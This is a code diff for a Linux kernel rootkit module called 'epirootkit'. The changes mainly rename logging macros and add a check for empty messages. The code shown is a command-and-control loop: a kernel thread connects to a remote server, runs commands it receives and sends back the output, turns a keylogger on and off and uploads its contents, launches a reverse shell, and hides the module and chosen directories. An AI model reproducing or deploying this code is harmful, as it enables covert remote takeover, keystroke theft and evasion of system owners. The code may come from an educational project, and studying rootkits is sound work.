@@ -19,7 +19,7 @@ int close_socket(void)
 	if (sock) {
 		sock_release(sock);
 		sock = NULL;
-		pr_info("close_socket: socket released\n");
+		DBG_MSG("close_socket: socket released\n");
 	}
 	return SUCCESS;
 }
@@ -47,7 +47,7 @@ int send_to_server(char *message)
 	int ret_code = 0;
 
 	if (!sock) {
-		pr_err("send_to_server: socket is NULL\n");
+		ERR_MSG("send_to_server: socket is NULL\n");
 		return -FAILURE;
 	}
 
@@ -56,7 +56,7 @@ int send_to_server(char *message)
 
 	ret_code = kernel_sendmsg(sock, &msg, &vec, 1, vec.iov_len);
 	if (ret_code < 0) {
-		pr_err("send_to_server: failed to send message: %d\n", ret_code);
+		ERR_MSG("send_to_server: failed to send message: %d\n", ret_code);
 		return -FAILURE;
 	}
 
@@ -80,14 +80,14 @@ int network_worker(void *data)
 
 	// Convert IP address string into 4-byte binary format
 	if (!in4_pton(ip, -1, ip_binary, -1, NULL)) {
-		pr_err("network_worker: invalid IPv4\n");
+		ERR_MSG("network_worker: invalid IPv4\n");
 		return -FAILURE;
 	}
 
 	// Create a TCP socket in kernel space
 	ret_code = sock_create(AF_INET, SOCK_STREAM, IPPROTO_TCP, &sock);
 	if (ret_code < 0) {
-		pr_err("network_worker: socket creation failed: %d\n", ret_code);
+		ERR_MSG("network_worker: socket creation failed: %d\n", ret_code);
 		return -FAILURE;
 	}
 
@@ -101,7 +101,7 @@ int network_worker(void *data)
 	while (!kthread_should_stop()) {
 		ret_code = sock->ops->connect(sock, (struct sockaddr *)&addr, sizeof(addr), 0);
 		if (ret_code < 0) {
-			pr_err("network_worker: failed to connect to %s:%d (%d), retrying...\n", ip, port, ret_code);
+			ERR_MSG("network_worker: failed to connect to %s:%d (%d), retrying...\n", ip, port, ret_code);
 			msleep(TIMEOUT_BEFORE_RETRY);
 			continue;
 		}
@@ -115,20 +115,24 @@ int network_worker(void *data)
 	do {
 		ret_code = send_to_server(message);
 		if (ret_code != SUCCESS) {
-			pr_err("network_worker: failed to send message, retrying... (attempt %d/%d)\n", attempts + 1, MAX_SENDING_MSG_ATTEMPTS);
+			ERR_MSG("network_worker: failed to send message, retrying... (attempt %d/%d)\n", attempts + 1, MAX_MSG_SEND_OR_RECEIVE_ERROR);
 			msleep(TIMEOUT_BEFORE_RETRY);
 			attempts++;
 		}
-	} while (ret_code != SUCCESS && attempts < MAX_SENDING_MSG_ATTEMPTS);
+	} while (ret_code != SUCCESS && attempts < MAX_MSG_SEND_OR_RECEIVE_ERROR);
 
 	// If all attempts to send the message failed, abort
 	if (ret_code < 0) {
-		pr_err("network_worker: failed to send message after 10 attempts, giving up.\n");
+		ERR_MSG("network_worker: failed to send message after 10 attempts, giving up.\n");
 		return -FAILURE;
 	}
 
-	pr_info("network_worker: message sent to %s:%d\n", ip, port);
+	DBG_MSG("network_worker: message sent to %s:%d\n", ip, port);
 
+	// Count of empty messages in a row received
+	// This is used to determine if the server is still active
+	// and to avoid flooding the server with empty messages
+	unsigned empty_count = 0;
 	// Listen for commands
 	// Retry until 'killcom' is received or thread is stopped by unmonting the module
 	while (!kthread_should_stop()) {
@@ -142,21 +146,33 @@ int network_worker(void *data)
 		// Wait to receive a message from the server
 		ret_code = kernel_recvmsg(sock, &recv_msg, &recv_vec, 1, recv_vec.iov_len, 0);
 		if (ret_code < 0) {
-			pr_err("network_worker: error receiving message: %d\n", ret_code);
+			ERR_MSG("network_worker: error receiving message: %d\n", ret_code);
 			msleep(TIMEOUT_BEFORE_RETRY);
 			continue;
 		}
 
 		// Null-terminate the received message
 		recv_buffer[ret_code] = '\0';
-		pr_info("network_worker: received: %s", recv_buffer);
+		DBG_MSG("network_worker: received: %s", recv_buffer);
+
+		// Check if the received message is empty
+		if (recv_buffer[0] == '\0') {
+			empty_count++;
+			if (empty_count > MAX_MSG_SEND_OR_RECEIVE_ERROR) {
+				ERR_MSG("network_worker: too many empty messages, exiting...\n");
+				break;
+			}
+			continue;
+		} else {
+			empty_count = 0; // Reset the empty message count
+		}
 
 		// Parse and handle the received command
 		if (strncmp(recv_buffer, "exec ", 5) == 0) {
 			// Extract the command from the received message
 			char *command = recv_buffer + 5;
 			command[strcspn(command, "\n")] = '\0';
-			pr_info("network_worker: executing command: %s\n", command);
+			DBG_MSG("network_worker: executing command: %s\n", command);
 			exec_str_as_command(command);
 
 			// Send the result back to the server
@@ -167,53 +183,53 @@ int network_worker(void *data)
 						exec_result.std_out, exec_result.std_err, exec_result.code);
 			ret_code = send_to_server(result_msg);
 			if (ret_code != SUCCESS) {
-				pr_err("network_worker: failed to send result message\n");
+				ERR_MSG("network_worker: failed to send result message\n");
 			}
-			pr_info("network_worker: command result sent\n");
+			DBG_MSG("network_worker: command result sent\n");
 		} else if (strncmp(recv_buffer, "klgon ", 5) == 0) {
 			epikeylog_init(0);
 			send_to_server("keylogger activated\n");
-			pr_info("network_worker: keylogger activated\n");
+			DBG_MSG("network_worker: keylogger activated\n");
 		} else if (strncmp(recv_buffer, "klgoff", 6) == 0) {
 			epikeylog_exit();
 			send_to_server("keylogger deactivated\n");
-			pr_info("network_worker: keylogger deactivated\n");
+			DBG_MSG("network_worker: keylogger deactivated\n");
 		} else if (strncmp(recv_buffer, "klg", 3) == 0) {
 			epikeylog_send_to_server();
-			pr_info("epirootkit: network_worker: keylogger content sent\n");
+			DBG_MSG("epirootkit: network_worker: keylogger content sent\n");
 		} else if (strncmp(recv_buffer, "shellon", 7) == 0) {
-			pr_info("epirootkit: network_worker: shellon received, launching reverse shell\n");
+			DBG_MSG("epirootkit: network_worker: shellon received, launching reverse shell\n");
 			launch_reverse_shell();		
 		} else if (strncmp(recv_buffer, "killcom", 7) == 0) {
-			pr_info("network_worker: killcom received, exiting...\n");
+			DBG_MSG("network_worker: killcom received, exiting...\n");
 			break;
 		} else if (strncmp(recv_buffer, "hide_module", 11) == 0) {
-			pr_info("epirootkit: network_worker: hiding module\n");
+			DBG_MSG("epirootkit: network_worker: hiding module\n");
 			hide_module();
 		} else if (strncmp(recv_buffer, "unhide_module", 13) == 0) {
-			pr_info("epirootkit: network_worker: unhiding module\n");
+			DBG_MSG("epirootkit: network_worker: unhiding module\n");
 			unhide_module();
 		} else if (strncmp(recv_buffer, "hide_dir",8) == 0) {
 			char *command = recv_buffer + 9;
 			command[strcspn(command, "\n")] = '\0';
 			if (add_hidden_dir(command) < 0) {
-				pr_err("epirootkit: network_worker: failed to hide directory\n");
+				ERR_MSG("epirootkit: network_worker: failed to hide directory\n");
 			} else {
-				pr_info("epirootkit: network_worker: directory %s hidden\n", recv_buffer + 9);
+				DBG_MSG("epirootkit: network_worker: directory %s hidden\n", recv_buffer + 9);
 			}
 		} else if (strncmp(recv_buffer, "show_dir", 8) == 0) {
 			char *command = recv_buffer + 9;
 			command[strcspn(command, "\n")] = '\0';
 			if (remove_hidden_dir(command) < 0) {
-				pr_err("epirootkit: network_worker: failed to unhide directory\n");
+				ERR_MSG("epirootkit: network_worker: failed to unhide directory\n");
 			} else {
-				pr_info("epirootkit: network_worker: directory %s unhidden\n", recv_buffer + 9);
+				DBG_MSG("epirootkit: network_worker: directory %s unhidden\n", recv_buffer + 9);
 			}
 		} 
 	}
 
 	// Final cleanup before thread exits
-	pr_info("network_worker: thread ends.\n");
+	DBG_MSG("network_worker: thread ends.\n");
 	thread_exited = true;
 	close_socket();
 
